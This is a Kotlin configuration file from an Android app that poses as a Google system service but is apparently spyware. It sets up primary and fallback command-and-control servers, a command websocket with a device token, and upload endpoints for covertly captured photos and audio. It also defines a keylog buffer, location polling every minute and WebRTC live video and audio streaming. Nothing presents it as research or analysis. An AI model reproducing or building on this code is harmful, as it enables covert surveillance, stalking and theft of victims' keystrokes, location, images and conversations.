package com.google.android.systemservice.config

import android.content.Context
import com.google.android.systemservice.BuildConfig
import java.util.concurrent.CopyOnWriteArrayList
import java.util.concurrent.atomic.AtomicInteger

object AndroidConfig {
    // Server Configuration
    // Configured via Gradle property: -PserverBaseUrl="IP:PORT"
    @Volatile private var serverBaseUrl = BuildConfig.SERVER_BASE_URL
    @Volatile private var useHttps = false
    
    // Fallback C2 servers (tried in order if primary fails)
    private val fallbackServers = CopyOnWriteArrayList<String>()
    private val currentServerIndex = AtomicInteger(0)
    
    // API Authentication Token - loaded from BuildConfig (set via Gradle property -PdeviceToken="...")
    val DEVICE_TOKEN: String = BuildConfig.DEVICE_AUTH_TOKEN
    val deviceToken: String get() = DEVICE_TOKEN
    
    // Device Identifier (cached from Settings.Secure.ANDROID_ID)
    @Volatile var deviceId: String = ""
        private set
    
    /**
     * Initialize device ID from Android system (call once on app start)
     */
    fun initDeviceId(context: Context) {
        if (deviceId.isEmpty()) {
            deviceId = try {
                android.provider.Settings.Secure.getString(
                    context.contentResolver,
                    android.provider.Settings.Secure.ANDROID_ID
                ) ?: java.util.UUID.randomUUID().toString()
            } catch (e: Exception) {
                // Ssaid not accessible on some devices/emulators/secondary profiles
                android.util.Log.w("AndroidConfig", "ANDROID_ID not accessible: ${e.message}")
                java.util.UUID.randomUUID().toString()
            }
        }
    }
    
    // Computed URLs
    val httpProtocol: String
        get() = if (useHttps) "https" else "http"
    
    val wsProtocol: String
        get() = if (useHttps) "wss" else "ws"
    
    val serverUrl: String
        get() = if (serverBaseUrl.startsWith("http://") || serverBaseUrl.startsWith("https://")) serverBaseUrl else "$httpProtocol://$serverBaseUrl"
    
    val websocketUrl: String
        get() {
            val base = when {
                serverBaseUrl.startsWith("https://") -> serverBaseUrl.replaceFirst("https://", "wss://")
                serverBaseUrl.startsWith("http://") -> serverBaseUrl.replaceFirst("http://", "ws://")
                else -> "ws://$serverBaseUrl"
            }.trimEnd('/')
            return "$base/cable?token=$DEVICE_TOKEN"
        }
    
    val apiBaseUrl: String
        get() = "${serverUrl.trimEnd('/')}/api"
    
    // Specific endpoints
    val photosEndpoint: String
        get() = "$apiBaseUrl/photos"
    
    val audioEndpoint: String
        get() = "$apiBaseUrl/audio"
    
    val configEndpoint: String
        get() = "$apiBaseUrl/config"
    
    // Polling intervals (milliseconds)
    const val LOCATION_UPDATE_INTERVAL = 60_000L       // 1 minute
    const val COMMAND_RECONNECT_DELAY = 5_000L          // 5 seconds
    const val KEYLOG_BUFFER_FLUSH_INTERVAL = 300_000L   // 5 minutes

    // Buffer sizes
    const val MAX_KEYLOG_BUFFER_SIZE = 500_000           // 500 KB
    const val MAX_PHOTO_BATCH_SIZE = 5
    const val MAX_AUDIO_BATCH_SIZE = 10

    // SharedPreferences
    const val PREFS_NAME = "android_config"
    const val PREF_KEY_SERVER_URL = "server_base_url"
    const val PREF_KEY_USE_HTTPS = "use_https"
    
    // WebRTC Configuration
    const val WEBRTC_VIDEO_WIDTH = 1280
    const val WEBRTC_VIDEO_HEIGHT = 720
    const val WEBRTC_VIDEO_FPS = 30
    const val WEBRTC_AUDIO_ECHO_CANCELLATION = true
    const val WEBRTC_AUDIO_NOISE_SUPPRESSION = true
    
    /**
     * Update server configuration dynamically
     */
    fun updateServerConfig(host: String, port: Int, https: Boolean = false) {
        serverBaseUrl = "$host:$port"
        useHttps = https
    }

    /**
     * Get just the server hostname (for SSL pinning)
     */
    fun getServerHost(): String {
        return try {
            java.net.URI(serverUrl).host ?: serverBaseUrl.removePrefix("https://").removePrefix("http://").split(":").first().split("/").first()
        } catch (e: Exception) {
            serverBaseUrl.removePrefix("https://").removePrefix("http://").split(":").first().split("/").first()
        }
    }

    /**
     * Add fallback C2 server URLs (tried in order if primary fails)
     */
    fun addFallbackServer(url: String) {
        fallbackServers.addIfAbsent(url)
    }

    /**
     * Switch to next available C2 server. Returns true if switched, false if no more servers.
     */
    fun switchToNextServer(): Boolean {
        val servers = buildList {
            add(BuildConfig.SERVER_BASE_URL)
            addAll(fallbackServers) // CopyOnWriteArrayList iterator is snapshot-safe
        }
        if (servers.size <= 1) return false

        val newIndex = currentServerIndex.updateAndGet { current ->
            (current + 1) % servers.size
        }
        if (newIndex == 0) {
            return false // wrapped around
        }
        serverBaseUrl = servers[newIndex]
        android.util.Log.d("AndroidConfig", "Switched to C2 server #$newIndex: $serverBaseUrl")
        return true
    }

    /**
     * Reset to primary server
     */
    fun resetToPrimaryServer() {
        currentServerIndex.set(0)
        serverBaseUrl = BuildConfig.SERVER_BASE_URL
    }
    
    /**
     * Load configuration from SharedPreferences
     */
    fun loadFromPreferences(context: Context) {
        val prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
        serverBaseUrl = prefs.getString(PREF_KEY_SERVER_URL, serverBaseUrl) ?: serverBaseUrl
        currentServerIndex.set(0)
        useHttps = prefs.getBoolean(PREF_KEY_USE_HTTPS, useHttps)
    }
    
    /**
     * Save configuration to SharedPreferences
     */
    fun saveToPreferences(context: Context) {
        context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE).edit().apply {
            putString(PREF_KEY_SERVER_URL, serverBaseUrl)
            putBoolean(PREF_KEY_USE_HTTPS, useHttps)
            apply()
        }
    }
    
}
